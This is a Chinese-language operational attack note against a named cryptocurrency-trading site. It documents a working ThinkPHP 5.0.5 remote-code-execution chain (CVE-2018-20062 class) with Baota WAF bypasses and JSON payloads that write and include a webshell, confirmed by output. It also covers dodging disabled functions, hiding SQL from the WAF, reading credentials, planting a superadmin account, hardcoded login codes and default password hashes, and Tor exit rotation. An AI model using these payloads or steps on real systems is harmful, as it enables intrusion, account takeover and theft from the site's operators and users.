# ThinkPHP 5.0.5 + 宝塔 WAF — invokefunction JSON gadget（2026-09-23 thjcoin.cc）

CVE-2018-20062 类。`app_debug=true`，路径 `/www/wwwroot/<site>/`，PHP 7.2，宝塔单杀关键词。调试页向 `think\Request` 构造器私有 / `Function X() does not exist` 证明 gadget 路由已进应用层—不是 404。

## WAF 单杀（不要再磨）

| 载体 | 结果 |
|---|---|
| 查询串 `invokefunction` / `_method=__construct` | 接口接 000 / 宝塔 HTML 403 |
| 文件名 `.php` `.phtml` `.htaccess` `.user.ini` | 403 |
| 正文 `<?php` / `<?=eval` / `select *` / `eval(` / `private function` | 403 或 RST |
| form `file_put_contents` 缺 `context` 或 `context=0` | 500 `方法参数错误:context` 或空 200 |
| 散落 `/ok.php` `/router.php` | nginx **404**（不走 PHP-FPM） |

干净 GIF/PNG 上传可过，不能当壳。

## 活链（JSON body + PATH_INFO）

```
POST /index.php/index/think\app/invokefunction
Content-Type: application/json

{"function":"file_put_contents","vars":["/www/wwwroot/<site>/public/x.txt","<?=$_GET[c]($_GET[d]);",0,null]}
```

然后：

```
POST /index.php/index/think\app/invokefunction?c=FUNCTION&d=ARG
Content-Type: application/json

{"function":"think\\__include_file","vars":["/www/wwwroot/<site>/public/x.txt"]}
```

实证：`c=var_dump&d=GETSHELLOK` → `string(10) "GETSHELLOK"`。
JSON 里 `<` 可 `<` 转义。`vars` 必须 **4 项**：`[path, data, 0, null]`；命名参 `filename/data/flags` 会 500。

**命名空间**：`think\__include_file` 成立；光 `__include_file` → `Function __include_file() does not exist`。

## 代码执行面

- `system/exec/passthru/shell_exec/proc_open/putenv` 在 `disable_functions`。走 PHP 内建：`file_put_contents` / `highlight_file` / `include` / PDO。
- `create_function` 回 `\x00lambda_N` — **跨请求无法 invoke**（新 PHP 进程），别磨。
- nginx 不解析散落 `.php` → **gadget 本身就是壳**，不要再写独立马。
- SQL 放进 include 的 txt，查询 **base64_decode**，避 WAF 杀 `select *`。
- `highlight_file($abs, true)` 读 `application/database.php` / `Login.php`。

## 微交易 / HitBTC 套皮

- 超管在 `wp_userinfo.otype=3`，**不是** 空表 `wp_admininfo`。
- 密码 **裸 `md5($password)`**；`admin` 额外硬编码安全码（实证 `asd888`）；session token `md5('nimashabi')`。
- `Login.php` 常有 `private function sysnd518login()` — URL 点不开（private）；WAF 拦改源码。**INSERT 一个 otype=3 号** 比改 private 快。
- 代理大量默认 md5(`abc123456`)=`0659c7992e268962384eb17fafe88364`。
- **没有私钥/助记词（2026-09-23 用户当面问）。** `wp_bankcard.accntno` 与 `wp_payment.pay_conf` 全是充值地址；`usermoney` 是点数。先 `show columns` 确认无 `privkey`/`mnemonic`/`keystore`，再 `highlight_file` Pay.php——微信/支付宝网关 ≠ 热钱包。地址可以报，别说成能花的密钥。

## 传输

直连邻段 80/443 常 Timeout；Tor `socks5h://user:pass@127.0.0.1:9050`（`IsolateSOCKSAuth` 换出口）。JSON POST 加 `Expect: ""`。
